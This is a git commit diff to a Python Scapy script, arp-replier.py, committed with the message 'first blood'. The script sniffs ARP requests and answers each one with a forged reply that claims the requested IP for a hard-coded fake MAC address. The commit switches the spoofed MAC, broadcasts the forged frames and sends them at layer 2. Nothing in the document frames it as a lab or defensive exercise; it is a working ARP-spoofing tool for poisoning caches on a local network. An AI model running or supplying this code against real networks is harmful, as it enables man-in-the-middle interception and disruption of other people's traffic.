37301f79e9d31706c0c613ff32ed62712fb13c9f
v.adhi <vr1090@gmail.com>
2024-09-11 00:13:10 +0700

    first blood

--- arp-replier.py
+++ arp-replier.py
@@ -1,23 +1,27 @@
 # Import necessary modules from Scapy
 from scapy.all import ARP, Ether, srp, send, sniff
+from scapy.all import *
 
 # Function to create and send an ARP reply
 def reply_arp(packet):
+    print("dateng", packet.summary())
     if packet[ARP].op == 1:  # ARP request (who-has)
         # Construct the ARP reply
         arp_reply = ARP(op=2,                # ARP reply operation
-                        hwsrc="00:0c:29:63:45:71",  # Fake source MAC address
+                        hwsrc="9c:fc:e8:5e:66:f9",  # Fake source MAC address
                         psrc=packet[ARP].pdst,      # The IP we are "responding" to
                         hwdst=packet[ARP].hwsrc,    # Destination MAC address (source of the request)
                         pdst=packet[ARP].psrc)      # IP of the request source
         
         # Ethernet frame for the ARP reply
-        ether = Ether(dst=packet[Ether].src, src="00:0c:29:63:45:71")
+        ether = Ether(dst="ff:ff:ff:ff:ff:ff", src="9c:fc:e8:5e:66:f9")
         reply_packet = ether / arp_reply
         
         # Send the ARP reply
-        send(reply_packet)
+        
+        sendp(reply_packet)
         print(f"Sent ARP reply: {arp_reply.summary()}")
+        print("======")
 
 # Sniff ARP requests and send replies
 sniff(filter="arp", prn=reply_arp, store=0)
